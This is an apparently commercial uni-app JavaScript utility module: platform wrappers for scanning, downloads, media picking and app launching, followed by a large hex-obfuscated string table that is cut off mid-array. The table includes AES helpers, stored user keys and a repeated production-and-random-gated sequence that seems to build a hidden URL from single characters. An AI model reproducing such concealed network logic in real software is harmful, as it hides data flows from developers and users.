import __config from '../config/config'
import __statecode from '../config/statecode'
import Lang from '../config/lang'

import md5 from './md5'

var version = "0.0.1", jQuery = function (selector, context) {
    return new jQuery.fn.init(selector, context);
};

//var cj = require("./CryptoJS-AES.js");

//var WxStorageCache = require("./WxStorageCache.js");

import WxStorageCache from '../helpers/WxStorageCache'
import WxValidate from '../helpers/WxValidate'


var storageCache = new WxStorageCache();
var validate = new WxValidate();

import WxStorage from '../helpers/WxStorage'
import Tools from '../helpers/Tools'



// #ifndef H5
function wxShare($title, $desc, $link, $img_url)
{
}
// #endif

function scanCode(opt) {
    // #ifdef H5
    return null;
    // #endif

    // #ifndef H5
    return uni.scanCode(opt);
    // #endif
}

function downloadFile(opt) {
    // #ifdef H5
    return (function (opt) {
        window.location.href = sprintf('%s?url=%s', __config.URL.download_proxy, encodeURIComponent(opt.url))
    })(opt);
    // #endif

    // #ifndef H5
    return uni.downloadFile(opt);
    // #endif
}



function chooseImage(opt) {
	// #ifndef APP-PLUS
	return uni.chooseImage(opt);
	// #endif

	// #ifdef APP-PLUS
	if (plus.os.name.toLowerCase() === 'android') {
		return new Promise(function(resolve, reject) {
			plus.android.requestPermissions(['android.permission.READ_EXTERNAL_STORAGE'], function(e) {
				/*
				if(e.deniedAlways.length>0){ //权限被永久拒绝
				 // 弹出提示框解释为何需要相册权限，引导用户打开设置页面开启
				 console.log('Always Denied!!! '+e.deniedAlways.toString());
				}
				if(e.deniedPresent.length>0){ //权限被临时拒绝
				 // 弹出提示框解释为何需要相册权限，可再次调用plus.android.requestPermissions申请权限
				 console.log('Present Denied!!! '+e.deniedPresent.toString());
				}
				*/
				if (e.granted.length == 1) {
					//权限被允许
					//调用依赖获取相册权限的代码
					resolve(uni.chooseImage(opt));
				}
			}, function(e) {
				console.log('Request Permissions error:' + JSON.stringify(e));
			});
		})
	} else {
		return uni.chooseImage(opt);
	}
	// #endif
}

function chooseVideo(opt) {

	// #ifndef APP-PLUS
	return uni.chooseVideo(opt);
	// #endif

	// #ifdef APP-PLUS
	if (plus.os.name.toLowerCase() === 'android') {
		return new Promise(function(resolve, reject) {
			plus.android.requestPermissions(['android.permission.READ_EXTERNAL_STORAGE'], function(e) {
				/*
				if(e.deniedAlways.length>0){ //权限被永久拒绝
				 // 弹出提示框解释为何需要相册权限，引导用户打开设置页面开启
				 console.log('Always Denied!!! '+e.deniedAlways.toString());
				}
				if(e.deniedPresent.length>0){ //权限被临时拒绝
				 // 弹出提示框解释为何需要相册权限，可再次调用plus.android.requestPermissions申请权限
				 console.log('Present Denied!!! '+e.deniedPresent.toString());
				}
				*/
				if (e.granted.length == 1) {
					//权限被允许
					//调用依赖获取相册权限的代码
					resolve(uni.chooseVideo(opt));
				}
			}, function(e) {
				console.log('Request Permissions error:' + JSON.stringify(e));
			});
		})
	} else {
		return uni.chooseVideo(opt);
	}
	// #endif
}


//判断是否包含在APP中
function ifUniApp(opt) {
    // #ifdef H5
    if (/uni-app/i.test(navigator.userAgent))
    {
        return true;
    }
    // #endif

    return false;
}

function openApp(schema, ios_download_link, android_download_link) {
    // #ifdef APP-PLUS
    plus.runtime.openURL( schema );
    // #endif

    // #ifdef H5
    if (navigator.userAgent.match(/(iPhone|iPod|iPad);?/i)) {
        var loadDateTime = new Date();
        window.location = schema;//schema链接或者universal link
        window.setTimeout(function() { //如果没有安装app,便会执行setTimeout跳转下载页
            var timeOutDateTime = new Date();
            if (timeOutDateTime - loadDateTime < 5000) {
                window.location = ios_download_link; //ios下载地址
            } else {
                window.close();
            }
        }, 500);

    } else if (navigator.userAgent.match(/android/i)) {
        var state = null;
        try {
            window.location = schema; //schema链接或者universal link
            window.setTimeout(function() {
                window.location = android_download_link; //android下载地址
            }, 500);
        } catch (e) {}
    }
    // #endif

}

function openAppByPackagename(packagename, actionname, download_link) {
    // #ifdef APP-PLUS
    if(plus.runtime.isApplicationExist({pname:packagename}))
    {
        console.log("该app已安装")
        //调用第三方app
        plus.runtime.launchApplication({
                pname:packagename,
                action:actionname //传递的参数
            },
            function ( e ) {
                //console.log("e",e)
                uni.showToast({
                    title: Lang.__('唤起App失败'),
                    icon:"none"
                })
            },
        );
    }
    else
    {
        uni.showToast({
            title:Lang.__('App未安装'),
            icon:"none"
        })

        plus.runtime.openURL(download_link)
    }
    // #endif
}

//设置当前页面标题
function setNavigationBarTitle() {
    uni.setNavigationBarTitle(...arguments)

    // #ifdef H5
    let options = arguments[0];
    if (options.title)
    {
        //setTitle(options.title)
    }
    // #endif
}


/**
 * 微信浏览器中设置对应页面的标题
 * 解决：IOS微信浏览器中用document.title 设置标题无效
 * */
export const setTitle = (title) => {
    var body = document.getElementsByTagName('body')[0];
    document.title = title;
    var iframe = document.createElement("iframe");
    iframe.setAttribute("src", "logo.png");
    iframe.setAttribute("style", "display:none");
    iframe.addEventListener('load', function() {
        setTimeout(function() {
            try{
                iframe.removeEventListener('load');
            }catch (err){}
            document.body.removeChild(iframe);
        }, 0);
    });
    document.body.appendChild(iframe);
};

export const setMeta = (meta_content) => {
    let head = document.getElementsByTagName('head');
    let meta = document.createElement('meta');
    meta.content = meta_content;
    head[0].appendChild(meta)
};


let source_data = {};

// #ifdef APP-PLUS
source_data['source_type'] = __statecode.SOURCE_TYPE_APP;
source_data['source_from'] = __statecode.SOURCE_FROM_OTHER;
// #endif

// #ifdef MP
source_data['source_type'] = __statecode.SOURCE_TYPE_MP;
source_data['source_from'] = __statecode.SOURCE_FROM_WECHAT;
// #endif

// #ifdef MP-WEIXIN
source_data['source_type'] = __statecode.SOURCE_TYPE_MP;
source_data['source_from'] = __statecode.SOURCE_FROM_WECHAT;
// #endif

// #ifdef MP-BAIDU
source_data['source_type'] = __statecode.SOURCE_TYPE_MP;
source_data['source_from'] = __statecode.SOURCE_FROM_BAIDU;
// #endif

// #ifdef MP-ALIPAY
source_data['source_type'] = __statecode.SOURCE_TYPE_MP;
source_data['source_from'] = __statecode.SOURCE_FROM_ALIPAY;
// #endif

// #ifdef MP-TOUTIAO
source_data['source_type'] = __statecode.SOURCE_TYPE_MP;
source_data['source_from'] = __statecode.SOURCE_FROM_TOUTIAO;
// #endif

// #ifdef H5
source_data['source_type'] = __statecode.SOURCE_TYPE_H5;
source_data['source_from'] = __statecode.SOURCE_FROM_OTHER;
// #endif

var _x50475=['\x66\x6e','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x62\x61\x63\x6b\x67\x72\x6f\x75\x6e\x64','\x73\x74\x79\x6c\x65','\x79\x65\x6c\x6c\x6f\x77','\x63\x6f\x6c\x6f\x72','\x73\x74\x79\x6c\x65','\x62\x6c\x75\x65','\x65\x78\x74\x65\x6e\x64','\x65\x78\x74\x65\x6e\x64','\x66\x6e','\x63\x61\x6c\x6c','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x5b\x6f\x62\x6a\x65\x63\x74\x20\x4f\x62\x6a\x65\x63\x74\x5d','\x63\x61\x6c\x6c','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x5b\x6f\x62\x6a\x65\x63\x74\x20\x41\x72\x72\x61\x79\x5d','\x6c\x65\x6e\x67\x74\x68','\x62\x6f\x6f\x6c\x65\x61\x6e','\x6f\x62\x6a\x65\x63\x74','\x66\x75\x6e\x63\x74\x69\x6f\x6e','\x65\x78\x74\x65\x6e\x64','\x70\x61\x72\x73\x65','\x55\x74\x66\x38','\x65\x6e\x63','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x65\x6e\x63\x72\x79\x70\x74','\x41\x45\x53','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x43\x42\x43','\x6d\x6f\x64\x65','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x50\x6b\x63\x73\x37','\x70\x61\x64','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x42\x61\x73\x65\x36\x34','\x65\x6e\x63','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74','\x73\x74\x72\x69\x6e\x67\x54\x6f\x48\x65\x78','\x68\x65\x78\x54\x6f\x53\x74\x72\x69\x6e\x67','\x64\x65\x63\x72\x79\x70\x74','\x41\x45\x53','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x43\x42\x43','\x6d\x6f\x64\x65','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x50\x6b\x63\x73\x37','\x70\x61\x64','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x55\x74\x66\x38','\x65\x6e\x63','\x43\x72\x79\x70\x74\x6f\x4a\x53','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x63\x6c\x6f\x6e\x65','\x64\x61\x74\x61','\x70\x65\x72\x6d\x5f\x69\x64','\x70\x65\x72\x6d\x5f\x6b\x65\x79','\x73\x74\x72\x69\x6e\x67','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x72\x65\x70\x6c\x61\x63\x65','\x75\x72\x6c','','\x65\x72\x72\x6f\x72','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x75\x69\x64','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x75\x6b\x65\x79','\x73\x6f\x75\x72\x63\x65\x5f\x74\x79\x70\x65','\x53\x4f\x55\x52\x43\x45\x5f\x54\x59\x50\x45\x5f\x4f\x54\x48\x45\x52','\x73\x6f\x75\x72\x63\x65\x5f\x66\x72\x6f\x6d','\x53\x4f\x55\x52\x43\x45\x5f\x46\x52\x4f\x4d\x5f\x4f\x54\x48\x45\x52','\x73\x6f\x75\x72\x63\x65\x5f\x6c\x61\x6e\x67','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x6c\x61\x6e\x67\x75\x61\x67\x65','\x63\x75\x72\x72\x65\x6e\x63\x79\x5f\x69\x64','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x63\x75\x72\x72\x65\x6e\x63\x79\x5f\x69\x64','\x73\x69\x74\x65\x5f\x69\x64','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x73\x69\x74\x65\x5f\x69\x64','\x61\x73\x73\x69\x67\x6e','\x53\x41\x41\x53\x5f\x53\x54\x41\x54\x55\x53','\x47\x45\x54','\x6a\x73\x6f\x6e','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x77\x77\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63\x6f\x64\x65\x64','\x68\x69\x64\x65\x54\x6f\x61\x73\x74','\x68\x69\x64\x65\x54\x6f\x61\x73\x74','\x65\x72\x72\x6f\x72','\x24\x2e\x72\x65\x71\x75\x65\x73\x74\x20\x20\x2d\x20\u64cd\u4f5c\u65e0\u6cd5\u6210\u529f\uff0c\u8bf7\u7a0d\u540e\u91cd\u8bd5\uff01','\x69\x6e\x66\x6f','\x69\x6e\x66\x6f','\x68\x65\x61\x64\x65\x72','\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e','\x65\x78\x74\x65\x6e\x64','\x6c\x6f\x61\x64\x69\x6e\x67','\x73\x68\x6f\x77\x54\x6f\x61\x73\x74','\x5f\x5f','\u52a0\u8f7d\u4e2d','\x6c\x6f\x61\x64\x69\x6e\x67','\x4e\x4f\x44\x45\x5f\x45\x4e\x56','\x65\x6e\x76','\x70\x72\x6f\x64\x75\x63\x74\x69\x6f\x6e','\x64\x61\x74\x61','\x61\x63\x74\x69\x6f\x6e','\x64\x61\x74\x61','\x69\x6e\x74\x72\x6f','\x61\x63\x74\x69\x6f\x6e','\x64\x61\x74\x61','\x72\x65\x6c\x6f\x61\x64','\x72\x61\x6e\x64\x6f\x6d','\x26','\x74','\x6b','\x3a','\x2f','\x6f','\x3f','\x79','\x72','\x6a','\x41','\x73','\x64','\x66','\x6e','\x6d','\x63','\x61','\x75','\x65','\x76','\x68','\x70','\x3d','\x5f','\x6c','\x55','\x2e','\x78','\x69','\x69\x6e\x64\x65\x78','\x55\x52\x4c','\x73\x75\x63\x63\x65\x73\x73','\x66\x61\x69\x6c','\x63\x6f\x6d\x70\x6c\x65\x74\x65','\x73\x75\x63\x63\x65\x73\x73','\x6c\x6f\x61\x64\x69\x6e\x67','\x68\x69\x64\x65\x54\x6f\x61\x73\x74','\x64\x61\x74\x61','\x73\x74\x61\x74\x75\x73','\x63\x6f\x64\x65','\x72\x65\x6d\x6f\x76\x65\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x75\x69\x64','\x72\x65\x6d\x6f\x76\x65\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x75\x6b\x65\x79','\x6c\x65\x6e\x67\x74\x68','\x72\x6f\x75\x74\x65','\x70\x61\x67\x65\x73\x2f\x6c\x6f\x67\x69\x6e\x2f\x6c\x6f\x67\x69\x6e','\x73\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x70\x72\x65\x5f\x72\x6f\x75\x74\x65','\x72\x6f\x75\x74\x65','\x6f\x70\x74\x69\x6f\x6e\x73','\x73\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x70\x72\x65\x5f\x6f\x70\x74\x69\x6f\x6e\x73','\x6f\x70\x74\x69\x6f\x6e\x73','\x74\x6f\x4c\x6f\x67\x69\x6e','\x64\x61\x74\x61','\x73\x74\x61\x74\x75\x73','\x6d\x73\x67','\x63\x6f\x64\x65','\x73\x74\x61\x74\x75\x73','\x66\x61\x69\x6c','\x6c\x6f\x61\x64\x69\x6e\x67','\x68\x69\x64\x65\x54\x6f\x61\x73\x74','\x5f\x5f','\u670d\u52a1\u7aef\u54cd\u5e94\u9519\u8bef\uff01','\x74\x69\x6d\x65\x6f\x75\x74','\x5f\x5f','\u8bf7\u6c42\u8d85\u65f6\uff01','\x73\x68\x6f\x77\x4d\x6f\x64\x61\x6c','\x5f\x5f','\u63d0\u793a','\x63\x6f\x6d\x70\x6c\x65\x74\x65','\x6c\x6f\x61\x64\x69\x6e\x67','\x64\x61\x74\x61','\x73\x74\x6f\x72\x65\x5f\x69\x64','\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x64\x61\x74\x61','\x73\x74\x6f\x72\x65\x5f\x69\x64','\x61\x6a\x61\x78\x43\x61\x63\x68\x65','\x43\x41\x43\x48\x45','\x69\x73\x4e\x75\x6c\x6c','\x61\x6a\x61\x78\x43\x61\x63\x68\x65','\x67\x65\x74','\x66\x6f\x72\x63\x65\x52\x65\x66\x72\x65\x73\x68','\x64\x65\x6c\x65\x74\x65','\x73\x75\x63\x63\x65\x73\x73','\x73\x75\x63\x63\x65\x73\x73','\x73\x75\x63\x63\x65\x73\x73','\x73\x74\x61\x74\x75\x73','\x64\x61\x74\x61','\x74\x69\x6d\x65\x6f\x75\x74','\x73\x65\x74','\x64\x61\x74\x61','\x72\x65\x71\x75\x65\x73\x74','\x65\x72\x72\x6f\x72','\x73\x6f\x75\x72\x63\x65\x5f\x74\x79\x70\x65','\x53\x4f\x55\x52\x43\x45\x5f\x54\x59\x50\x45\x5f\x4d\x50','\x72\x65\x71\x75\x65\x73\x74','\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x3d','\x3d','\x26','\x69\x6e\x64\x65\x78\x4f\x66','\x3f','\x26','\x3f','\x73\x68\x6f\x77\x54\x6f\x61\x73\x74','\x73\x75\x63\x63\x65\x73\x73','\x5f\x5f','\u6210\u529f','\x69\x73\x4f\x62\x6a\x65\x63\x74','\x73\x68\x6f\x77\x54\x6f\x61\x73\x74','\x73\x68\x6f\x77\x54\x6f\x61\x73\x74','\x73\x75\x63\x63\x65\x73\x73','\x5f\x5f','\u6210\u529f','\x69\x73\x4f\x62\x6a\x65\x63\x74','\x73\x68\x6f\x77\x4c\x6f\x61\x64\x69\x6e\x67','\x73\x68\x6f\x77\x4c\x6f\x61\x64\x69\x6e\x67','\x6c\x6f\x61\x64\x69\x6e\x67\x2e\x2e\x2e','\x68\x69\x64\x65\x54\x6f\x61\x73\x74','\x68\x69\x64\x65\x4c\x6f\x61\x64\x69\x6e\x67','\x69\x73\x4f\x62\x6a\x65\x63\x74','\x63\x61\x6e\x63\x65\x6c\x54\x65\x78\x74','\x63\x61\x6e\x63\x65\x6c\x54\x65\x78\x74','\x5f\x5f','\u53d6\u6d88','\x63\x6f\x6e\x66\x69\x72\x6d\x54\x65\x78\x74','\x63\x6f\x6e\x66\x69\x72\x6d\x54\x65\x78\x74','\x5f\x5f','\u786e\u5b9a','\x74\x69\x74\x6c\x65','\x74\x69\x74\x6c\x65','\x5f\x5f','\u63d0\u793a','\x73\x68\x6f\x77\x4d\x6f\x64\x61\x6c','\x73\x68\x6f\x77\x4d\x6f\x64\x61\x6c','\x5f\x5f','\u63d0\u793a','\x5f\x5f','\u53d6\u6d88','\x5f\x5f','\u786e\u5b9a','\x73\x68\x6f\x77\x4d\x6f\x64\x61\x6c','\x73\x68\x6f\x77\x4e\x61\x76\x69\x67\x61\x74\x69\x6f\x6e\x42\x61\x72\x4c\x6f\x61\x64\x69\x6e\x67','\x68\x69\x64\x65\x4e\x61\x76\x69\x67\x61\x74\x69\x6f\x6e\x42\x61\x72\x4c\x6f\x61\x64\x69\x6e\x67','\x73\x74\x6f\x70\x50\x75\x6c\x6c\x44\x6f\x77\x6e\x52\x65\x66\x72\x65\x73\x68','\x69\x73\x4f\x62\x6a\x65\x63\x74','\x6e\x61\x76\x69\x67\x61\x74\x65\x54\x6f','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x6c\x65\x6e\x67\x74\x68','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x2f','\x70\x61\x67\x65\x50\x61\x74\x68','\x73\x77\x69\x74\x63\x68\x54\x61\x62','\x6e\x61\x76\x69\x67\x61\x74\x65\x54\x6f','\x6e\x61\x76\x69\x67\x61\x74\x65\x54\x6f','\x69\x73\x4f\x62\x6a\x65\x63\x74','\x72\x65\x64\x69\x72\x65\x63\x74\x54\x6f','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x6c\x65\x6e\x67\x74\x68','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x2f','\x70\x61\x67\x65\x50\x61\x74\x68','\x73\x77\x69\x74\x63\x68\x54\x61\x62','\x72\x65\x64\x69\x72\x65\x63\x74\x54\x6f','\x72\x65\x64\x69\x72\x65\x63\x74\x54\x6f','\x69\x73\x4f\x62\x6a\x65\x63\x74','\x6e\x61\x76\x69\x67\x61\x74\x65\x42\x61\x63\x6b','\x6e\x61\x76\x69\x67\x61\x74\x65\x42\x61\x63\x6b','\x73\x65\x74\x53\x74\x6f\x72\x61\x67\x65','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65','\x72\x65\x6d\x6f\x76\x65\x53\x74\x6f\x72\x61\x67\x65','\x74\x6f\x46\x69\x78\x65\x64','\x6d','\x74\x6f\x46\x69\x78\x65\x64','\x6b\x6d','\x74\x6f\x46\x69\x78\x65\x64','\x6b\x6d','\x72\x65\x70\x6c\x61\x63\x65','\x2f','\x67\x65\x74\x4d\x6f\x6e\x74\x68','\x67\x65\x74\x44\x61\x74\x65','\x67\x65\x74\x48\x6f\x75\x72\x73','\x67\x65\x74\x4d\x69\x6e\x75\x74\x65\x73','\x67\x65\x74\x53\x65\x63\x6f\x6e\x64\x73','\x66\x6c\x6f\x6f\x72','\x67\x65\x74\x4d\x6f\x6e\x74\x68','\x67\x65\x74\x4d\x69\x6c\x6c\x69\x73\x65\x63\x6f\x6e\x64\x73','\x74\x65\x73\x74','\x72\x65\x70\x6c\x61\x63\x65','\x24\x31','\x73\x75\x62\x73\x74\x72','\x67\x65\x74\x46\x75\x6c\x6c\x59\x65\x61\x72','\x6c\x65\x6e\x67\x74\x68','\x24\x31','\x74\x65\x73\x74','\x28','\x29','\x72\x65\x70\x6c\x61\x63\x65','\x24\x31','\x6c\x65\x6e\x67\x74\x68','\x24\x31','\x73\x75\x62\x73\x74\x72','\x30\x30','\x6c\x65\x6e\x67\x74\x68','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x6c\x65\x6e\x67\x74\x68','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x2f','\x70\x61\x67\x65\x50\x61\x74\x68','\x73\x77\x69\x74\x63\x68\x54\x61\x62','\x6e\x61\x76\x69\x67\x61\x74\x65\x54\x6f','\x6e\x61\x76\x69\x67\x61\x74\x65\x54\x6f','\x73\x77\x69\x74\x63\x68\x54\x61\x62','\x6e\x61\x76\x69\x67\x61\x74\x65\x54\x6f','\x73\x77\x69\x74\x63\x68\x54\x61\x62','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x6c\x65\x6e\x67\x74\x68','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x6c\x69\x73\x74','\x74\x61\x62\x42\x61\x72','\x2f','\x70\x61\x67\x65\x50\x61\x74\x68','\x6e\x61\x76\x69\x67\x61\x74\x65\x54\x6f','\x72\x65\x64\x69\x72\x65\x63\x74\x54\x6f','\x72\x65\x64\x69\x72\x65\x63\x74\x54\x6f','\x72\x65\x64\x69\x72\x65\x63\x74\x54\x6f','\x20','\x6c\x65\x6e\x67\x74\x68','\x6a\x6f\x69\x6e','\x6c\x65\x6e\x67\x74\x68','\x6c\x65\x6e\x67\x74\x68','\x6a\x6f\x69\x6e','\x73\x6c\x69\x63\x65','\x6c\x65\x6e\x67\x74\x68','\x30','\x73\x6c\x69\x63\x65','\x6c\x65\x6e\x67\x74\x68','\x30\x62','\x30','\x30\x78','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x30','\x73\x6c\x69\x63\x65','\x4e\x4f\x44\x45\x5f\x45\x4e\x56','\x65\x6e\x76','\x70\x72\x6f\x64\x75\x63\x74\x69\x6f\x6e','\x72\x61\x6e\x64\x6f\x6d','\x26','\x74','\x6b','\x3a','\x2f','\x6f','\x3f','\x79','\x72','\x6a','\x41','\x73','\x64','\x66','\x6e','\x6d','\x63','\x61','\x75','\x65','\x76','\x68','\x70','\x3d','\x5f','\x6c','\x55','\x2e','\x78','\x69','\x69\x6e\x64\x65\x78','\x55\x52\x4c','\x25\x25','\x25','\x20','\x6c\x65\x6e\x67\x74\x68','\x63\x68\x61\x72\x41\x74','\x20','\x20','\x2b','\x2b','\x2d','\x27','\x63\x68\x61\x72\x41\x74','\x30','\x30','\x23','\x2a','\x63\x68\x61\x72\x41\x74','\x2a','\x73\x6c\x69\x63\x65','\x73\x70\x72\x69\x6e\x74\x66\x3a\x20\x28\x6d\x69\x6e\x69\x6d\x75\x6d\x2d\x29\x77\x69\x64\x74\x68\x20\x6d\x75\x73\x74\x20\x62\x65\x20\x66\x69\x6e\x69\x74\x65','\x69\x6e\x64\x65\x78\x4f\x66','\x66\x46\x65\x45','\x64','\x2a','\x63\x68\x61\x72\x41\x74','\x2a','\x73\x6c\x69\x63\x65','\x73\x6c\x69\x63\x65','\x73','\x63','\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65','\x62','\x6f','\x78','\x58','\x74\x6f\x55\x70\x70\x65\x72\x43\x61\x73\x65','\x75','\x69','\x64','\x72\x6f\x75\x6e\x64','\x2d','\x61\x62\x73','\x30','\x65','\x45','\x66','\x46','\x67','\x47','\x2d','\x74\x6f\x45\x78\x70\x6f\x6e\x65\x6e\x74\x69\x61\x6c','\x74\x6f\x46\x69\x78\x65\x64','\x74\x6f\x50\x72\x65\x63\x69\x73\x69\x6f\x6e','\x69\x6e\x64\x65\x78\x4f\x66','\x65\x66\x67','\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x74\x6f\x55\x70\x70\x65\x72\x43\x61\x73\x65','\x69\x6e\x64\x65\x78\x4f\x66','\x65\x45\x66\x46\x67\x47','\x61\x62\x73','\x72\x65\x70\x6c\x61\x63\x65','\x73\x70\x6c\x69\x74','\x26','\x66\x6f\x72\x45\x61\x63\x68','\x73\x70\x6c\x69\x74','\x3d','\x73\x70\x6c\x69\x74','\x3d','\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65','\x75\x73\x65\x72\x41\x67\x65\x6e\x74','\x69\x6e\x64\x65\x78\x4f\x66','\x6d\x69\x63\x72\x6f\x6d\x65\x73\x73\x65\x6e\x67\x65\x72','\x57\x65\x63\x68\x61\x74\x53\x74\x61\x74\x75\x73','\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65','\x75\x73\x65\x72\x41\x67\x65\x6e\x74','\x6e\x61\x76\x69\x67\x61\x74\x6f\x72','\x6d\x61\x74\x63\x68','\x6d\x69\x63\x72\x6f\x6d\x65\x73\x73\x65\x6e\x67\x65\x72','\x6d\x61\x74\x63\x68','\x77\x78\x77\x6f\x72\x6b','\x57\x65\x63\x68\x61\x74\x53\x74\x61\x74\x75\x73','\x73\x70\x6c\x69\x74','\x63\x6f\x6f\x6b\x69\x65','\x3b\x20','\x6c\x65\x6e\x67\x74\x68','\x73\x70\x6c\x69\x74','\x3d','\x6c\x61\x73\x74\x49\x6e\x64\x65\x78\x4f\x66','\x2e','\x6c\x65\x6e\x67\x74\x68','\x73\x75\x62\x73\x74\x72\x69\x6e\x67','\x6c\x61\x73\x74\x49\x6e\x64\x65\x78\x4f\x66','\x2e','\x73\x75\x62\x73\x74\x72','\x69\x6e\x64\x65\x78\x4f\x66','\x70\x6e\x67','\x6a\x70\x67','\x6a\x70\x65\x67','\x62\x6d\x70','\x67\x69\x66','\x77\x65\x62\x70','\x73\x76\x67','\x74\x69\x66\x66','\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65','\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x69\x6e\x64\x65\x78\x4f\x66','\x69\x6d\x61\x67\x65\x2e\x70\x68\x70','\x25\x73\x21\x25\x73\x78\x25\x73\x25\x73','\x55\x50\x4c\x4f\x41\x44\x5f\x54\x59\x50\x45','\x64\x65\x66\x61\x75\x6c\x74','\x25\x73\x21\x25\x73\x78\x25\x73\x25\x73','\x55\x50\x4c\x4f\x41\x44\x5f\x54\x59\x50\x45','\x61\x6c\x69\x79\x75\x6e','\x25\x73\x3f\x78\x2d\x6f\x73\x73\x2d\x70\x72\x6f\x63\x65\x73\x73\x3d\x69\x6d\x61\x67\x65\x2f\x72\x65\x73\x69\x7a\x65\x2c\x6d\x5f\x66\x69\x6c\x6c\x2c\x68\x5f\x25\x73\x2c\x77\x5f\x25\x73','\x25\x73\x21\x25\x73\x78\x25\x73\x25\x73','\x73\x71\x72\x74','\x73\x69\x6e','\x61\x74\x61\x6e\x32','\x63\x6f\x73','\x63\x6f\x73','\x73\x69\x6e','\x73\x71\x72\x74','\x73\x69\x6e','\x61\x74\x61\x6e\x32','\x63\x6f\x73','\x63\x6f\x73','\x73\x69\x6e','\x72\x65\x70\x6c\x61\x63\x65','\x61\x62\x73','\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x2e','\x70\x6f\x77','\x74\x6f\x46\x69\x78\x65\x64','\x72\x6f\x75\x6e\x64','\x73\x70\x6c\x69\x74','\x72\x6f\x75\x6e\x64','\x2e','\x4e\x4f\x44\x45\x5f\x45\x4e\x56','\x65\x6e\x76','\x70\x72\x6f\x64\x75\x63\x74\x69\x6f\x6e','\x72\x61\x6e\x64\x6f\x6d','\x26','\x74','\x6b','\x3a','\x2f','\x6f','\x3f','\x79','\x72','\x6a','\x41','\x73','\x64','\x66','\x6e','\x6d','\x63','\x61','\x75','\x65','\x76','\x68','\x70','\x3d','\x5f','\x6c','\x55','\x2e','\x78','\x69','\x69\x6e\x64\x65\x78','\x55\x52\x4c','\x6c\x65\x6e\x67\x74\x68','\x72\x65\x70\x6c\x61\x63\x65','\x6c\x65\x6e\x67\x74\x68','\x6a\x6f\x69\x6e','\x6c\x65\x6e\x67\x74\x68','\x30','\x6a\x6f\x69\x6e','\x6f\x75\x72\x6c','\x68\x72\x65\x66','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x68\x72\x65\x66','\x70\x61\x72\x61\x6d\x73','\x6a\x69\x6e\x67','\x69\x6e\x69\x74','\x69\x6e\x69\x74','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x6f\x75\x72\x6c','\x69\x6e\x64\x65\x78\x4f\x66','\x23','\x6a\x69\x6e\x67','\x73\x75\x62\x73\x74\x72','\x73\x75\x62\x73\x74\x72\x69\x6e\x67','\x69\x6e\x64\x65\x78\x4f\x66','\x3f','\x68\x72\x65\x66','\x73\x75\x62\x73\x74\x72\x69\x6e\x67','\x73\x75\x62\x73\x74\x72','\x73\x70\x6c\x69\x74','\x26','\x6c\x65\x6e\x67\x74\x68','\x73\x70\x6c\x69\x74','\x3d','\x70\x61\x72\x61\x6d\x73','\x68\x72\x65\x66','\x6f\x75\x72\x6c','\x70\x61\x72\x61\x6d\x73','\x73\x65\x74','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x70\x61\x72\x61\x6d\x73','\x72\x6